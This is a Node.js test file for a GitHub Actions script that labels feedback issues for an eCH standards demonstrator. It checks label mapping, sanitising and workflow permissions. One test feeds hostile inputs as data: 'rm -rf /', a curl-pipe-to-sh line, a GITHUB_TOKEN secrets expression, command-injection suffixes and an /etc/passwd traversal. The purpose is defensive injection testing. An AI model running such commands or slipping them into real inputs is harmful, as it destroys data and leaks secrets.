// Tests für feedback-label.js: node --test .github/scripts/feedback-label.test.js

'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const test = require('node:test');
const { leseFormular, bestimmeLabels, setzeLabels } = require('./feedback-label.js');

const wurzel = path.resolve(__dirname, '..', '..');

function formular(felder = {}) {
  const werte = {
    Standard: 'ech-0003',
    'Baustein-ID': 'ech-0003-bb-schema-eigene-version',
    Stand: 'eCH-0003 V11.1.0, Build 2026-11-06 (a05c2c3)',
    'Link zur Stelle': 'https://ech-ch.github.io/beyond-pdf-demonstrator/ech-0003/v11.1.0/de/index.html#ech-0003-bb-schema-eigene-version',
    Wortlaut: '[MUSS] Besteht nebst einem eCH-Dokument auch ein Schema …',
    Art: 'Zum Inhalt',
    Kommentar: 'Ein Kommentar.',
    Vorschlag: '_No response_',
    ...felder,
  };
  return Object.entries(werte).map(([name, wert]) => `### ${name}\n\n${wert}`).join('\n\n');
}

function labels(felder, titel = 'Feedback zu … (…)') {
  return bestimmeLabels({ titel, text: formular(felder), wurzel });
}

test('feiner Baustein: alle Labels', () => {
  assert.deepEqual(labels({}), ['feedback', 'standard:ech-0003', 'bb:schema-eigene-version', 'art:inhalt']);
});

test('grober Baustein ohne Wortlaut: _No response_ wird abgefangen', () => {
  const l = labels({ 'Baustein-ID': 'ech-0003-bb-versionierung', Wortlaut: '_No response_', Art: 'Zum Zuschnitt oder zu Beziehungen' });
  assert.deepEqual(l, ['feedback', 'standard:ech-0003', 'bb:versionierung', 'art:zuschnitt']);
  assert.equal(leseFormular(formular({ Wortlaut: '_No response_' })).Wortlaut, '');
});

test('Standard als Ganzes: leere Baustein-ID ergibt bb:gesamt', () => {
  assert.deepEqual(labels({ 'Baustein-ID': '_No response_', Art: 'Frage' }), ['feedback', 'standard:ech-0003', 'bb:gesamt', 'art:frage']);
  assert.deepEqual(labels({ 'Baustein-ID': '', Art: 'Zum Demonstrator' }), ['feedback', 'standard:ech-0003', 'bb:gesamt', 'art:demonstrator']);
});

test('Anhang A: ech-0003-referenzen ergibt bb:referenzen', () => {
  assert.ok(labels({ 'Baustein-ID': 'ech-0003-referenzen' }).includes('bb:referenzen'));
});

test('Kap. 2–5 als Text ohne Bausteine: feedback-id ergibt bb:kapitel-… (AP26)', () => {
  for (const kapitel of ['standard', 'best-practice', 'hilfsmittel', 'white-paper']) {
    assert.ok(labels({ 'Baustein-ID': `ech-0003-kapitel-${kapitel}` }).includes(`bb:kapitel-${kapitel}`), kapitel);
  }
});

test('feedback-id, die nicht in der Quelle steht oder zu einem anderen Standard gehört: bb:unbekannt', () => {
  assert.ok(labels({ 'Baustein-ID': 'ech-0003-kapitel-gibt-es-nicht' }).includes('bb:unbekannt'));
  assert.ok(labels({ 'Baustein-ID': 'ech-0003-bb-kapitel-standard' }).includes('bb:unbekannt'));
  assert.ok(labels({ 'Baustein-ID': 'ech-0004-kapitel-standard' }).includes('bb:unbekannt'));
  assert.ok(labels({ Standard: 'ech-0004', 'Baustein-ID': 'ech-0003-kapitel-standard' }).includes('bb:unbekannt'));
});

test('Mehrfachbaustein', () => {
  assert.ok(labels({ 'Baustein-ID': 'ech-0003-bb-aenderungen-vorversion' }).includes('bb:aenderungen-vorversion'));
});

test('ID von Hand geändert: bb:unbekannt, kein Fehler', () => {
  assert.ok(labels({ 'Baustein-ID': 'ech-0003-bb-gibt-es-nicht' }).includes('bb:unbekannt'));
  assert.ok(labels({ 'Baustein-ID': 'ECH-0003-BB-SCHEMA-EIGENE-VERSION' }).includes('bb:unbekannt'));
  assert.ok(labels({ 'Baustein-ID': 'ech-0003-schema-eigene-version' }).includes('bb:unbekannt'));
});

test('bösartige Eingaben landen nie im Label', () => {
  const boese = [
    '`rm -rf /`',
    '$(curl https://example.org/x | sh)',
    '${{ secrets.GITHUB_TOKEN }}',
    'ech-0003-bb-schema-eigene-version; rm -rf /',
    'ech-0003-bb-schema-eigene-version`whoami`',
    '"; process.exit(1); //',
    'ech-0003-bb-' + 'a'.repeat(100000),
    '../../../etc/passwd',
    '<script>alert(1)</script>',
    'bb:admin',
  ];
  for (const id of boese) {
    for (const felder of [{ 'Baustein-ID': id }, { Art: id }, { Kommentar: id }, { Wortlaut: id }, { Standard: id }, { Stand: id }]) {
      const l = labels(felder);
      for (const label of l) {
        assert.match(label, /^(feedback|beispiel|(standard|bb|art):[a-z0-9-]+)$/, label.slice(0, 80));
        assert.ok(label.length <= 50);
      }
    }
    assert.ok(labels({ 'Baustein-ID': id }).includes('bb:unbekannt'), id.slice(0, 40));
    assert.equal(labels({ Art: id }).filter((x) => x.startsWith('art:')).length, 0);
  }
});

test('Standard: nur bekannte, gültige IDs; kein Zugriff ausserhalb des Repos', () => {
  for (const standard of ['../..', 'ech-0003/../..', 'ech-9999', '`id`', '$(id)', '']) {
    const l = labels({ Standard: standard });
    assert.ok(l.includes('standard:unbekannt'), standard);
    assert.ok(l.includes('bb:unbekannt'), standard);
  }
});

test('Überschrift im Kommentar überschreibt die vorbefüllten Felder nicht', () => {
  const l = labels({ Kommentar: '### Baustein-ID\n\nech-0003-bb-versionierung\n\n### Standard\n\nech-9999\n\n### Art\n\nFrage' });
  assert.deepEqual(l, ['feedback', 'standard:ech-0003', 'bb:schema-eigene-version', 'art:inhalt']);
});

test('Issue-Text mit CRLF', () => {
  assert.deepEqual(bestimmeLabels({ titel: 'x', text: formular().replace(/\n/g, '\r\n'), wurzel }),
    ['feedback', 'standard:ech-0003', 'bb:schema-eigene-version', 'art:inhalt']);
});

test('Beispiel-Issue: Label beispiel nur am Titelanfang', () => {
  assert.ok(labels({}, '[Beispiel] Feedback zu … (…)').includes('beispiel'));
  assert.ok(!labels({}, 'Feedback zu [Beispiel]').includes('beispiel'));
});

test('Text ohne Formular: keine Labels', () => {
  for (const text of ['Einfach ein Text', '', null, undefined, '### Standard\n\nech-0003']) {
    assert.equal(bestimmeLabels({ titel: 'x', text, wurzel }), null);
  }
});

function attrappe({ vorhanden = [], rennen = [] } = {}) {
  const aufrufe = { angelegt: [], gesetzt: [], kommentare: 0 };
  const github = {
    rest: {
      issues: {
        getLabel: async ({ name }) => {
          if (vorhanden.includes(name)) return {};
          throw Object.assign(new Error('Not Found'), { status: 404 });
        },
        createLabel: async ({ name, color }) => {
          assert.match(color, /^[0-9a-f]{6}$/);
          if (rennen.includes(name)) throw Object.assign(new Error('exists'), { status: 422 });
          aufrufe.angelegt.push(name);
        },
        addLabels: async ({ issue_number, labels: l }) => { aufrufe.gesetzt.push([issue_number, l]); },
        createComment: async () => { aufrufe.kommentare += 1; },
      },
    },
  };
  const log = [];
  return {
    github, aufrufe, log,
    core: { info: (x) => log.push(x) },
    context: (issue) => ({ repo: { owner: 'ech-ch', repo: 'beyond-pdf-demonstrator' }, payload: { issue } }),
  };
}

test('setzeLabels: legt fehlende Labels an, setzt alle, schreibt keinen Kommentar', async () => {
  const a = attrappe({ vorhanden: ['feedback'], rennen: ['art:inhalt'] });
  const l = await setzeLabels({ github: a.github, core: a.core, wurzel, context: a.context({ number: 7, title: '[Beispiel] x', body: formular() }) });
  assert.deepEqual(l, ['feedback', 'standard:ech-0003', 'bb:schema-eigene-version', 'art:inhalt', 'beispiel']);
  assert.deepEqual(a.aufrufe.angelegt, ['standard:ech-0003', 'bb:schema-eigene-version', 'beispiel']);
  assert.deepEqual(a.aufrufe.gesetzt, [[7, l]]);
  assert.equal(a.aufrufe.kommentare, 0);
});

test('setzeLabels: fremder Text steht nicht im Log', async () => {
  const a = attrappe();
  const boese = '::set-output name=x::`rm -rf /`';
  await setzeLabels({ github: a.github, core: a.core, wurzel, context: a.context({ number: 8, title: boese, body: formular({ 'Baustein-ID': boese, Kommentar: boese }) }) });
  assert.ok(!a.log.join('\n').includes(boese));
});

test('setzeLabels: anderer Fehler beim Prüfen eines Labels bricht ab', async () => {
  const a = attrappe();
  a.github.rest.issues.getLabel = async () => { throw Object.assign(new Error('Serverfehler'), { status: 500 }); };
  await assert.rejects(setzeLabels({ github: a.github, core: a.core, wurzel, context: a.context({ number: 9, title: 'x', body: formular() }) }));
});

test('Workflow: keine Ausdrücke mit Issue-Inhalten, knappe Rechte', () => {
  const yml = fs.readFileSync(path.join(wurzel, '.github/workflows/feedback-label.yml'), 'utf8');
  assert.ok(!yml.includes('${{'), 'kein ${{ }} im Workflow');
  assert.match(yml, /issues: write/);
  assert.match(yml, /contents: read/);
  assert.ok(!/contents: write|pull-requests:|actions:/.test(yml));
});

test('Formular: Überschriften und Arten passen zur Auswertung', () => {
  const yml = fs.readFileSync(path.join(wurzel, '.github/ISSUE_TEMPLATE/feedback.yml'), 'utf8');
  for (const name of ['Standard', 'Baustein-ID', 'Stand', 'Link zur Stelle', 'Wortlaut', 'Art', 'Kommentar', 'Vorschlag']) {
    assert.ok(yml.includes(`label: ${name}\n`), name);
  }
  for (const art of ['Zum Inhalt', 'Zum Zuschnitt oder zu Beziehungen', 'Zum Demonstrator', 'Frage']) {
    assert.ok(yml.includes(`- ${art}\n`), art);
  }
});
